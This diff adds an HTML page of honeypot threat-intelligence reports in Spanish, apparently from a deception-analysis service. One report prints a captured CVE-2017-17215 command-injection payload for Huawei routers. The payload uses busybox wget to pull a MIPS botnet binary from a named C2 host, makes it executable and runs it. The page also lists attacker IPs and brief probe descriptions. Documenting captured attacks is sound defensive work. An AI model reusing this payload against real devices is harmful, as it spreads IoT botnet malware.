@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reportes IP | Vigilia Abyssi Threat Intelligence</title>
+    <link rel="stylesheet" href="style.css?v=1.4">
+    <style>
+        .report-card {
+            background: var(--cve-gray);
+            border-left: 5px solid var(--cve-orange);
+            padding: 25px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .report-header {
+            color: var(--cve-blue);
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: bold;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+        }
+        .report-content {
+            white-space: pre-wrap;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            color: var(--text-dark);
+        }
+        .tag-hell {
+            color: var(--cve-orange);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="news-ticker">INTELIGENCIA DE AMENAZAS - REPORTES DE ACTIVIDAD CAPTURADA POR HONEYPOT</div>
+    <header>
+        <div class="container" style="max-width: 1000px; margin: 0 auto;">
+            <h1>REPORTES IP</h1>
+            <p class="subtitle">Análisis de Nodos de Ataque y Botnets en Tiempo Real</p>
+        </div>
+    </header>
+
+    <main>
+        <nav style="margin-bottom: 30px;">
+            <a href="index.html" class="read-more">← VOLVER AL INICIO</a>
+        </nav>
+
+        <!-- SECCIÓN DE REPORTE 01 -->
+        <section class="report-card">
+            <div class="report-header">#HONEypot #ThreatIntel - VIG-2026-0309-001</div>
+            <div class="report-content">
+This payload (yeye.mips) was captured by an active defense honeypot.
+It attempts to exploit Huawei routers via CVE-2017-17215 (UPnP SOAP command injection on port 37215).
+
+Attack Vector (Decoded SOAP):
+$(/bin/busybox wget -g 193.233.193.12 -l /tmp/.oxy -r /yeye/yeye.mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)
+
+Attacker IP: 187.120.33.192 (Infected Node)
+C2 Dropzone: 193.233.193.12
+Malware Family: Mirai/Gafgyt Variant (IoT Botnet)
+Architecture: MIPS
+Action: Drops malware, changes permissions, executes and self-replicates.
+            </div>
+        </section>
+
+        <!-- SECCIÓN DE REPORTE 02 (Detecciones Recientes) -->
+        <section class="report-card">
+            <div class="report-header">#HONEypot #ThreatIntel - DETECCIONES RECIENTES (2026-03-09)</div>
+            <div class="report-content">
+[+] NODO DETECTADO: 193.29.13.39
+    - Acción: RDP Brute Force / BlueKeep Attempt
+    - Payload: Cookie: mstshash=Administr
+    - Estado: Capturado en Tarpit
+
+[+] NODO DETECTADO: 8.216.18.14
+    - Acción: TLS Vulnerability Scan (Heartbleed/POODLE probe)
+    - Payload: TLS 1.0 Client Hello Handshake
+    - Estado: Fingerprinting Mitigado
+
+[+] NODO DETECTADO: 85.11.183.23
+    - Acción: Stealth Web Bot / Scraper
+    - Payload: Fake User-Agent Chrome v140.0.0.0
+    - Estado: Bloqueo de Perfilado Activo
+            </div>
+        </section>
+
+    </main>
+
+    <footer>
+        <p>&copy; 2026 Vigilia Abyssi - Sistema de Análisis de Decepción</p>
+    </footer>
+</body>
+</html>
